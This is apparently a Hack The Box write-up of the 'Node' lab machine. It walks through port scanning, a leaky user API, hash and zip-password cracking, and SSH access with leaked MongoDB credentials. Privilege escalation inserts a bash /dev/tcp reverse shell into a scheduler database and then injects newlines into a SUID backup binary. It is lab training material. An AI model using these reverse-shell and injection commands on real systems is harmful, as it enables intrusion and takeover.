# Node [htb](https://app.hackthebox.com/machines/110)
![node-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/node-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 node.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/ports-02.png)

Let's run a version detection scan on these two ports:

```bash
nmap -p 22,3000 -sCV node.htb -oN nmap.result
```

![namp-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/nmap-res-03.png)

We have the following:

+ AN SSH server on port 22.
+ A possible HTTP server on port 3000. 

Based on the `nmap` version detection scans it looks like the service running on port 3000 might be an HTTP server, this should be our main focus.


### Node.JS port 3000


Let's start by taking a look at the website at `http://node.htb:3000/`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/site-04.png)

Looks like we have a login page at the top-right side. And there are three member profiles we can visit. 

The `nmap` version detection scan suggested that the underlaying server is Apache, and I wanted to verify this. So I `curl` the page and greped for the `X-Powered-By` header:

```bash
curl -i http://node.htb:3000/ | grep -i x-powered-by
```

![curl-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/curl-05.png)

Looks like the underlaying server is `Node.JS Express`, not Apache. Worth noting as we move forward. 

If we try to login and fail we get the following error message:

![login-err-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/login-err-06.png)

So we can't enumerate valid credentials via the login feature. Let's check the member profiles:

![member-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/member-07.png)

Not much to see here, so I ran a directory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://node.htb:3000/FUZZ -e .cgi,.txt,.xml,.html,.js --fw 727
```

This brought a few interesting results, but I wasnt able to load any of them in my browser. Instead, I kept getting redirected to the main page of the website. I also ran sub-domain enumeration scan using `wfuzz`, but this came out empty as well. 

At this point I started searching for Node.js specific exploits, primarly, I focused on [prototype pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution) but I wasn't able to find a vulnerability of this sorts on the target. 

While I was exploring prototype pollution, I also went over all of the source code in the `assets/js/app/controllers/` directory to see if I can find something interesting, and inside the `/assets/js/app/controllers/login.js` file I found the following:

![source-07.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/source-07.5.png)

That's odd... if we succsesfully login as any user we get redirected to the admin page? I wasnt sure what to make of this at this point, so I decided to move forward.  

Next, I started to look around my target scope in Burp Suite, to see maybe there is an element to this server that I missed, and that's where I found the following:

![users-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/users-08.png)

When we request a member's profile page by clicking on their image, the server makes a request to `profiles/<username>`, which is then mapped to an api call for `/api/users/<username>`, and the response to this request for some reason, returns with it the JavaScript object for that user, including the SHA256 digest of their password, Identified [here](https://hashes.com/en/tools/hash_identifier):

![hash-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/hash-09.png)


The next step is to crack the hash, for that I used the `rockyou.txt` wordlist with hashcat as such:

```bash
hashcat -m 1400 "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73" rockyou.txt
```

After a few seconds the hash was cracked:

![cracked-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cracked-10.png)

Let's try to login with `mark:snowflake`:

![logged-in-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/logged-in-11.png)


Interesting, the site's saying that only an admin can access this page. In the member object we found earlier there was an `is_admin` key, which was set to `false` for each of the three members. My guess is that the backend checks if this key is set to `True` in order to give us the admin panel. The question is how do we change the value of this key to ture? Or could there be another user account?

At first I looked at prototype pollution, trying to send different javascript objects to modify the server's runtime object's properties, but this failed. 

Next, I tried to decrypt the session cookie we got after a succsesful login:

![cookie-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cookie-12.png)

I tried to brute force the cookie secret key but this didnt work. 

So I kept looking around the site while taking a look at Burp Suite's target section once again, to see if maybe Burp was able to find something that I missed. And then I found the following:

![users-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/users-13.png)

There is a forth user, and he is an admin! If we request the `/api/users` directory, the server response with all the users available on the system. 

Now we need to recrypt the password as we did with mark's account:

![cracked-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cracked-14.png)

Let's try to log in with `myP14ceAdm1nAcc0uNT:manchester`: 

![admin-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/admin-15.png)

It worked! Let's download this backup and see whats inside. 

After downloding and moving the file over to my working directory, I wanted to check the file type:

```bash
file myplace.backup
```

![file-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/file-16.png)

It says it's plain ASCII text, so I ran `cat` on the file to see what's inside. This printed a huge amount of text to the screen, but at the end I saw a familiar padding character:

![cat-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cat-17.png)

This is base64 encoded, let's decode it, and see run `file` on the result:

```bash
base64 -d myplace.backup > myplace.backup.decoded
file myplace.backup.decoded
```

![decoded-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/decoded-18.png)

It says it's a zip archive, let's extract it using:

```bash
unzip myplace.backup.decoded
```

![unzip-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/unzip-19.png)

It's password protected. We can try to crack the password using `john`:

```bash
zip2john myplace.backup.decoded > zipped.txt
john zipped.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After a couple of seconds the password is cracked:

![cracked-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cracked-20.png)

After unzipping the archive we get a new directory of `var`:

![var-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/var-21.png)


If we go a couple fo directories deeper, we will find the backend for the site:

![backend-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/backend-22.png)

Inside the `app.js` file I saw something interesting at the top:

![app-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/app-23.png)

This looks like a database connection string with clear text credentials for the user `mark`. 
Let's try to login to the ssh with these credentials:

![ssh-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/ssh-24.png)

They worked! Let's move on to privilege escalation.


## Privilege Escalation

After landing on the machine I start by taking a look at our user's home folder:

![home-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/home-25.png)

That's odd, everything here is owned by root. I wasn't sure what to make of this, so I decided to move forward and try to find easy wins. I looked for sudo permission but we have none. 

After that I decided to look for anu SUID binaries on the system:

```bash
find / -perm -4000 2>/dev/null
```

![suid-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/suid-26.png)

This binary looks interesting, I ran `ll` on it to list its permission:

![ll-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/ll-27.png)

Looks like only users in the `admin` group can run this binary. Unfortenatly, our user is not a part of this group:

![id-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/id-28.png)


So I decided to take a look at who is a part of the group:

![tail-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/tail-29.png)


Looks like `tom` and `root` are a part of the admin group. So our next logical goal would be to take over tom's account, though there isn't a clear way on how to do this just yet. However, from the previous steps we know there is a MongoDB on the system, so it's worth to take a look at.

I connect to the database and list the available tables using:

```bash
mongo myplace -u mark -p 5AYRft73VtFpc84k
``` 

![table-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/table-30.png)

Then I list the table with:

```bash
db.users.find().pretty()
```

![users-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/users-31.png)

Unfortenatly this is not new information, these are the user accounts from the MyPlace site. Back to the drawing board.

Next, I decioded to list out the running processes on the system using:

```bash
ps auxww
```

![auxww-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/auxww-32.png)

There are two interesting processes owned by `tom`, the first is the backend for the MyPlace site. This file we already know, as it was present in he backup we downloaded earlier. The `/var/scheduler/app.js`, file is something new, let's take a look at this file.

First let's check the files permissions:

```bash
ll /var/scheduler/app.js
``` 

[ll-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/ll-33.png)

Everyone can read the file, so let's do so:

![cat-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/cat-34.png)

Here we can see another MongoDB connection string, but this one is for a different database, `scheduler`. After the script connects to the database, it looks for entries inside the `tasks` table called `docs`, and adds them into an array. After which the script iterates over the array, and executes the command found in the `cmd` attribute of the `doc` using the `exec(doc.cmd)` function.  Once the execution is done the script removes the doc from the array. 


Let's try to connect to this database and see what are these tasks.

```bash
mongo scheduler -u mark -p 5AYRft73VtFpc84k
```

![tasks-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/tasks-35.png)

Looks like the table is empty, let's change that. 

Finding a working payload was quite challanging. But at the end I found that `bash -c "bash -i >& /dev/tcp/10.10.14.37/9001 0>&1"`, works. 

To insert this command to the database we can run:

```bash
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.37/9001 0>&1'"}
```

![insert-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/insert-36.png)

Next, I started a netcat listener on my attack machine using:

```bash
rlwrap nc -lnvp 9001
```

A couple of seconds later I get a connection as `tom`:

![tom-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/tom-37.png)

Now that we have access as `tom` we can take a look at the `/usr/local/bin/backup` binary. 

If we simply run the script without any arguments, nothing happens:

![nothing-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/nothing-38.png)

I ran `strings` on the binary to try and get more infoamtion but this didnt lead to anything super useful. However, when we downloaded the backup of the the MyPlace site, we went over the `/var/www/myplace/app.js` file. If we open this file once again and scroll down a bit we can see the following:

![app-get-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/app-get-39.png)

Here we can see how to use this binary. The `backup_key` variable is defined at the top of the file:

![key-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/key-40.png)

So the binary takes the `-q` swich, the `backup_key` and finally the directory to backup. Still at this point there isnt a clear way to exploit this to get root. After a while researching I came across the [NRPE vulnerability](https://www.exploit-db.com/exploits/32925) that outlines how we can exploit bash bainries that take in arguments from the command line. 

Here is the a short overview: 

Despite these checks the code is vulnerable to command injection as bash shell allows for multiple command execution if commands are separated by a new line. None of the checks examines the arguments for an occurrence of a new line character: 0x0A

To exploit the target we can run something like this:

```bash
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo -e 'aaa\n/bin/bash\nls')"
```

This gives us a shell as root:

![root-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Node/img/root-41.png)
